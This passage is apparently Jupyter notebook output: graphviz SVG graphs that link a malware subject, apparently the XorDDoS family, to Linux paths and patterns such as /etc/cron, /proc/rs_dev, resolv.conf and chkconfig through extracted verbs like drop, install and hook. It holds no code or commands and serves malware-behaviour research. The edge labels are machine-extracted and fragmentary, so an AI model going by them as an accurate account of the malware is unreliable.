      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"221pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 221.26 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 217.26,-127 217.26,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"100.26\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"100.26\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"100.26\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"100.26\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M39.06,-93.99C25.44,-88.79 12.6,-80.92 4.26,-69 -12.39,-45.21 26.03,-31.92 59.11,-25.13\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"59.97,-28.53 69.14,-23.22 58.66,-21.65 59.97,-28.53\"/>\n<text text-anchor=\"middle\" x=\"41.26\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">69.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M100.26,-86.8C100.26,-75.16 100.26,-59.55 100.26,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"103.76,-46.18 100.26,-36.18 96.76,-46.18 103.76,-46.18\"/>\n<text text-anchor=\"middle\" x=\"127.76\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M136.39,-88.87C144.32,-83.77 151.7,-77.22 156.26,-69 164.13,-54.8 151.08,-42.58 135.61,-33.78\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"136.85,-30.48 126.36,-29 133.64,-36.7 136.85,-30.48\"/>\n<text text-anchor=\"middle\" x=\"185.76\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">68.access</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x208538202b0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Ms.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"2957pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 2956.95 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 2952.95,-127 2952.95,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1418.65\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1418.65\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"71.65\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"71.65\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.55,-103.54C1049.73,-101.6 28.17,-93.1 4.65,-69 -8.44,-55.58 8.75,-42.97 28.99,-33.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"30.56,-36.9 38.41,-29.79 27.84,-30.46 30.56,-36.9\"/>\n<text text-anchor=\"middle\" x=\"27.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.drop</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge32\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.43,-103.42C1058.69,-101.12 95.15,-91.63 72.65,-69 66.74,-63.05 65.15,-54.46 65.46,-46.07\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"68.94,-46.48 66.62,-36.14 61.98,-45.66 68.94,-46.48\"/>\n<text text-anchor=\"middle\" x=\"97.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">22.delete</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge36\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.41,-103.98C1085.46,-103.62 274.89,-100.03 161.65,-69 139.63,-62.97 117.18,-50.51 100.21,-39.53\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"102.13,-36.61 91.87,-33.97 98.25,-42.43 102.13,-36.61\"/>\n<text text-anchor=\"middle\" x=\"183.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">21.pass</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"447.65\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"447.65\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.36,-103.2C1078.08,-100.27 231.39,-89.31 211.65,-69 207.01,-64.22 207.3,-59.05 211.65,-54 236.08,-25.69 343.45,-19.9 404.61,-18.95\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"404.78,-22.45 414.73,-18.83 404.69,-15.45 404.78,-22.45\"/>\n<text text-anchor=\"middle\" x=\"230.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">36.use</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.69,-103.08C1087.57,-99.86 290.3,-88.23 271.65,-69 230.8,-26.88 340.54,-19.51 404.81,-18.67\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"405.12,-22.17 415.09,-18.59 405.06,-15.17 405.12,-22.17\"/>\n<text text-anchor=\"middle\" x=\"295.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">18.name</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge13\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.06,-104.4C1099.72,-105.25 376.32,-104.81 341.65,-69 318.73,-45.31 367.28,-31.58 406.02,-24.69\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"406.82,-28.11 416.11,-23.01 405.67,-21.2 406.82,-28.11\"/>\n<text text-anchor=\"middle\" x=\"367.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">14.check</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge30\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.17,-104.2C1111.39,-104.41 447.65,-102.14 415.65,-69 407.52,-60.58 412.91,-49.78 421.42,-40.38\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"424.04,-42.71 428.72,-33.21 419.13,-37.72 424.04,-42.71\"/>\n<text text-anchor=\"middle\" x=\"437.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">17.have</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge31\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.61,-103.01C1124.17,-99.96 519,-89.67 481.65,-69 472.01,-63.66 464.56,-54.29 459.12,-45.1\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"462.13,-43.3 454.35,-36.11 455.95,-46.58 462.13,-43.3\"/>\n<text text-anchor=\"middle\" x=\"500.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">28.call</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge35\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.37,-103.26C1141.27,-101.02 616.6,-92.91 541.65,-69 530.03,-65.29 529.26,-60.04 518.65,-54 506.69,-47.18 493.21,-40.34 481.24,-34.53\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"482.55,-31.28 472.02,-30.12 479.53,-37.6 482.55,-31.28\"/>\n<text text-anchor=\"middle\" x=\"564.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">11.hook</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge38\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.66,-102.98C1153.18,-100.15 678.96,-90.93 610.65,-69 599.03,-65.27 598.84,-58.88 587.65,-54 555.75,-40.08 517.24,-30.96 488.69,-25.53\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"489.12,-22.05 478.65,-23.69 487.86,-28.94 489.12,-22.05\"/>\n<text text-anchor=\"middle\" x=\"641.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">12.provide</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge41\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.26,-103.65C1182.58,-102.36 825.36,-96.42 706.65,-69 690.17,-65.19 687.92,-58.68 671.65,-54 609.71,-36.19 535.37,-26.85 489.83,-22.42\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"490.01,-18.92 479.73,-21.48 489.36,-25.89 490.01,-18.92\"/>\n<text text-anchor=\"middle\" x=\"735.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.contain</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"927.65\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"927.65\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.95,-102.61C1175.57,-99.22 794.85,-89.27 775.65,-69 743.2,-34.73 820.8,-23.92 876.65,-20.53\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"877,-24.02 886.79,-19.98 876.62,-17.03 877,-24.02\"/>\n<text text-anchor=\"middle\" x=\"801.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.create</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1342.28,-102.04C1190.98,-97.8 866.27,-86.66 849.65,-69 834.51,-52.89 858.11,-39.67 883.22,-30.88\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"884.42,-34.16 892.84,-27.73 882.24,-27.51 884.42,-34.16\"/>\n<text text-anchor=\"middle\" x=\"877.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge14\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.24,-104.07C1210.26,-103.37 956.41,-98.22 928.65,-69 922.94,-62.98 921.35,-54.48 921.61,-46.2\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"925.11,-46.34 922.75,-36.02 918.16,-45.56 925.11,-46.34\"/>\n<text text-anchor=\"middle\" x=\"965.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">7.resolv.conf</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge27\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1342.53,-101.6C1245.14,-97.77 1082.29,-88.61 1025.65,-69 1014.12,-65.01 1013.32,-59.93 1002.65,-54 990.76,-47.39 977.41,-40.88 965.3,-35.3\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"966.46,-31.99 955.91,-31.05 963.57,-38.36 966.46,-31.99\"/>\n<text text-anchor=\"middle\" x=\"1046.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">42.read</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge40\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1343.01,-100.92C1279.24,-97.04 1185.95,-88.36 1106.65,-69 1088.61,-64.6 1085.36,-59.6 1067.65,-54 1036.59,-44.18 1000.96,-35.31 973.42,-28.95\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"974.2,-25.54 963.67,-26.73 972.64,-32.36 974.2,-25.54\"/>\n<text text-anchor=\"middle\" x=\"1129.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">39.fetch</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1381.65\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1381.65\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1341.31,-104.34C1273.73,-102.79 1182.91,-95.61 1159.65,-69 1155.27,-63.98 1155.32,-59.07 1159.65,-54 1182.98,-26.71 1287.51,-20.57 1344.43,-19.27\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1344.54,-22.77 1354.47,-19.08 1344.41,-15.77 1344.54,-22.77\"/>\n<text text-anchor=\"middle\" x=\"1174.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.run</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1342.82,-101.18C1290.88,-97.46 1228.45,-88.87 1211.65,-69 1174.38,-24.89 1283.19,-18.59 1343.88,-18.36\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1344.24,-21.86 1354.25,-18.38 1344.25,-14.86 1344.24,-21.86\"/>\n<text text-anchor=\"middle\" x=\"1232.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">43.read</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge20\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1352.46,-95.63C1320.25,-90.06 1286.4,-81.44 1276.65,-69 1255.88,-42.49 1306.77,-29.3 1344.74,-23.32\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1345.65,-26.73 1355.04,-21.83 1344.64,-19.8 1345.65,-26.73\"/>\n<text text-anchor=\"middle\" x=\"1299.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">40.fetch</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge21\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1371.08,-90.61C1361.02,-85.5 1351.65,-78.52 1345.65,-69 1338.98,-58.4 1345.95,-47.03 1355.48,-37.81\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1357.81,-40.43 1363.08,-31.24 1353.23,-35.13 1357.81,-40.43\"/>\n<text text-anchor=\"middle\" x=\"1371.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.create</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge22\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1411.17,-86.8C1405.93,-74.78 1398.85,-58.51 1392.94,-44.92\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1396.08,-43.37 1388.88,-35.6 1389.66,-46.16 1396.08,-43.37\"/>\n<text text-anchor=\"middle\" x=\"1430.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge24\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1447.06,-88.06C1459.95,-78.67 1470.72,-66.27 1462.65,-54 1452.69,-38.84 1434.61,-30.22 1418.06,-25.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1418.59,-21.85 1408.04,-22.74 1416.84,-28.63 1418.59,-21.85\"/>\n<text text-anchor=\"middle\" x=\"1485.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.relate</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge25\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1475.27,-92.57C1501.26,-84.65 1523.54,-72.2 1509.65,-54 1498.54,-39.44 1451.83,-29.46 1418.04,-23.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1418.44,-20.51 1408.03,-22.44 1417.37,-27.43 1418.44,-20.51\"/>\n<text text-anchor=\"middle\" x=\"1540.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.contain</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge33\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1475.32,-92.66C1517.22,-84.01 1567.54,-72.92 1570.65,-69 1574.81,-63.78 1574.92,-59.13 1570.65,-54 1551.73,-31.25 1468.29,-23.22 1418.83,-20.44\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1418.99,-16.94 1408.82,-19.92 1418.63,-23.93 1418.99,-16.94\"/>\n<text text-anchor=\"middle\" x=\"1611.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">8.resolv.conf</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1766.65\" cy=\"-18\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1766.65\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1474.06,-92.42C1484.21,-90.48 1494.74,-88.58 1504.65,-87 1570.09,-76.57 1588.74,-86.49 1652.65,-69 1678.8,-61.84 1706.7,-49.7 1728.35,-39.17\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1730.12,-42.2 1737.52,-34.62 1727.01,-35.92 1730.12,-42.2\"/>\n<text text-anchor=\"middle\" x=\"1717.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">38.fetch</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge19\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1473.54,-92.13C1483.84,-90.19 1494.55,-88.37 1504.65,-87 1557.65,-79.8 1700.99,-99.88 1744.65,-69 1752.42,-63.51 1757.48,-54.65 1760.75,-45.9\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1764.13,-46.85 1763.75,-36.26 1757.44,-44.77 1764.13,-46.85\"/>\n<text text-anchor=\"middle\" x=\"1794.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.download</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1983.65\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1983.65\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1473.06,-92.05C1483.5,-90.09 1494.39,-88.29 1504.65,-87 1650.4,-68.71 1690.39,-96.61 1834.65,-69 1871.73,-61.9 1912.26,-47.87 1941.67,-36.48\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1943.17,-39.64 1951.2,-32.73 1940.61,-33.13 1943.17,-39.64\"/>\n<text text-anchor=\"middle\" x=\"1921.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.perform</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge28\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.59,-92.01C1483.17,-90.03 1494.23,-88.23 1504.65,-87 1554.57,-81.11 1914.01,-95.6 1956.65,-69 1965.26,-63.63 1971.31,-54.51 1975.47,-45.52\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1978.81,-46.58 1979.27,-35.99 1972.31,-43.98 1978.81,-46.58\"/>\n<text text-anchor=\"middle\" x=\"1995.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.install</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge37\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.58,-91.97C1483.17,-89.99 1494.22,-88.2 1504.65,-87 1533.32,-83.69 2003.61,-89.75 2023.65,-69 2032.09,-60.27 2026.05,-49.89 2016.36,-40.86\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2018.34,-37.96 2008.41,-34.27 2013.87,-43.35 2018.34,-37.96\"/>\n<text text-anchor=\"middle\" x=\"2048.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">25.add</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2147.65\" cy=\"-18\" rx=\"57.69\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2147.65\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/rs_dev</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.58,-91.94C1483.16,-89.97 1494.22,-88.19 1504.65,-87 1567.28,-79.86 2011.57,-88.04 2071.65,-69 2089.73,-63.27 2107.57,-51.92 2121.42,-41.47\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2123.78,-44.07 2129.49,-35.15 2119.46,-38.56 2123.78,-44.07\"/>\n<text text-anchor=\"middle\" x=\"2122.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">35.use</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge34\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.57,-91.91C1483.16,-89.94 1494.22,-88.17 1504.65,-87 1540,-83.04 2119.11,-93.75 2144.65,-69 2150.63,-63.21 2152.56,-54.77 2152.63,-46.47\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2156.1,-45.96 2151.89,-36.24 2149.12,-46.46 2156.1,-45.96\"/>\n<text text-anchor=\"middle\" x=\"2174.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.have</text>\n</g>\n<!-- 9 -->\n<g id=\"node10\" class=\"node\">\n<title>9</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2425.65\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2425.65\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.11,-91.98C1482.84,-89.98 1494.07,-88.18 1504.65,-87 1658.21,-69.96 2047.49,-95.72 2199.65,-69 2220.42,-65.35 2224.26,-59.35 2244.65,-54 2294.11,-41.04 2352.31,-30.62 2389.1,-24.63\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2390.02,-28.02 2399.34,-22.98 2388.91,-21.11 2390.02,-28.02\"/>\n<text text-anchor=\"middle\" x=\"2267.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.fetch</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge15\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.11,-91.95C1482.84,-89.96 1494.06,-88.16 1504.65,-87 1591.49,-77.49 2207.21,-94.85 2290.65,-69 2302.31,-65.39 2302.62,-59.2 2313.65,-54 2338.26,-42.4 2367.68,-33.38 2390.19,-27.4\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2391.19,-30.76 2400,-24.87 2389.44,-23.98 2391.19,-30.76\"/>\n<text text-anchor=\"middle\" x=\"2339.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">31.create</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge16\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.11,-91.94C1482.83,-89.94 1494.06,-88.15 1504.65,-87 1599.67,-76.69 2275,-102.11 2364.65,-69 2373.25,-65.83 2389.51,-52.32 2403.09,-40.15\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2405.65,-42.54 2410.69,-33.22 2400.94,-37.37 2405.65,-42.54\"/>\n<text text-anchor=\"middle\" x=\"2415.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge23\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.11,-91.92C1482.83,-89.93 1494.06,-88.14 1504.65,-87 1530.59,-84.21 2425.39,-87.62 2443.65,-69 2450.54,-61.99 2448.58,-52.15 2443.94,-43.06\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2446.83,-41.08 2438.64,-34.35 2440.85,-44.71 2446.83,-41.08\"/>\n<text text-anchor=\"middle\" x=\"2485.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">9.resolv.conf</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge29\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.1,-91.91C1482.83,-89.91 1494.06,-88.13 1504.65,-87 1532.89,-83.99 2506.76,-89.25 2526.65,-69 2549.53,-45.72 2499.71,-31.55 2462.22,-24.5\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2462.5,-21 